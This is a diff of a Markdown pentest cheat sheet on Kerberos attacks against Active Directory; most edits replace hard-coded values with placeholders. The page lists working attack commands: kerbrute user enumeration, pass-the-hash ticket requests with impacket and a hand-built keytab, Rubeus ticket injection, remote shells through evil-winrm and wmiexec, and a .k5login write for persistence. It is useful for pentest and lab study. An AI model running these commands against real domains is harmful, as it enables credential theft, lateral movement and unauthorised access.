@@ -4,7 +4,6 @@ date: 2024-7-2
 tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain controller", "Windows", "smb"]
 ---
 
----
 ### Users enum
 
 {{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
@@ -12,8 +11,8 @@ tags: ["kerberos", "kerbrute", "rubeus", "active directory", "ad", "domain contr
 
 <div>
 
-```bash
-kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
+```console
+kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
 ```
 
 </div>
@@ -29,8 +28,8 @@ kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
 
 <div>
 
-```bash
-./username-anarchy -i users.txt | tee usernames.txt
+```console
+./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
 ```
 
 </div>
@@ -51,15 +50,21 @@ kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator
+```console
+# Auth with password
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
 ```
 
-```bash
-export KRB5CCNAME=administrator.ccache
+```console
+# Auth with hash
+sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
 ```
 
-```bash
+```console
+export KRB5CCNAME=<USER>.ccache
+```
+
+```console
 # Check ticket
 klist
 ```
@@ -71,22 +76,22 @@ klist
 
 <div>
 
-```bash
+```console
 # Step 0: Installation
 sudo apt install krb5-user cifs-utils
 ```
 
-```bash
+```console
 # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
-10.10.11.10 <DC> <DOMAIN>
+<TARGET> <DC> <DOMAIN>
 ```
 
-```bash
+```console
 # Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
-nameserver 10.10.11.10
+nameserver <TARGET>
 ```
 
-```bash
+```console
 # Step 3: Edit '/etc/krb5.conf'
 
 [libdefaults]
@@ -104,7 +109,7 @@ nameserver 10.10.11.10
     domain.internal = <DOMAIN>
 ```
 
-```bash
+```console
 # Step 4: Sync time to domain controller
 sudo ntpdate -s <DC>
 ```
@@ -115,7 +120,7 @@ sudo ntpdate -s <DC>
 
 <div>
 
-```bash
+```console
 # Generate kerberos ticket for user
 kinit <USER>
 ```
@@ -126,27 +131,27 @@ kinit <USER>
 
 <div>
 
-```bash
+```console
 ktutil
 ```
 
-```bash
+```console
 add_entry -p administrator@<DOMAIN> -k 1 -key -e rc4-hmac
 ```
 
-```bash
+```console
 <HASH>
 ```
 
-```bash
+```console
 write_kt administrator.keytab
 ```
 
-```bash
+```console
 exit
 ```
 
-```bash
+```console
 kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
 ```
 
@@ -156,7 +161,7 @@ kinit -V -k -t administrator.keytab -f administrator@<DOMAIN>
 
 <div>
 
-```bash
+```console
 klist
 ```
 
@@ -171,8 +176,8 @@ klist
 
 <div>
 
-```powershell
-.\Rubeus.exe asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
+```console
+.\Rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
 ```
 
 </div>
@@ -192,7 +197,7 @@ klist
 
 <div>
 
-```bash
+```console
 # Step 1: Edit '/etc/krb5.conf'
 
 [libdefaults]
@@ -211,7 +216,7 @@ klist
 ```
 
 
-```bash
+```console
 # Step 2: Connect
 sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 ```
@@ -223,8 +228,8 @@ sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-wmiexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
+```console
+sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/administrator@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 </div>
@@ -239,8 +244,8 @@ sudo ntpdate -s <DC> && impacket-wmiexec <DOMAIN>/administrator@<TARGET_DOMAIN> 
 
 <div>
 
-```bash
-sudo ntpdate -s <DC> && impacket-smbclient <DOMAIN>/<USER>@<TARGET_DOMAIN> -k -no-pass
+```console
+sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
 ```
 
 </div>
@@ -253,7 +258,7 @@ sudo ntpdate -s <DC> && impacket-smbclient <DOMAIN>/<USER>@<TARGET_DOMAIN> -k -n
 
 <div>
 
-```bash
+```console
 echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
 ```
 
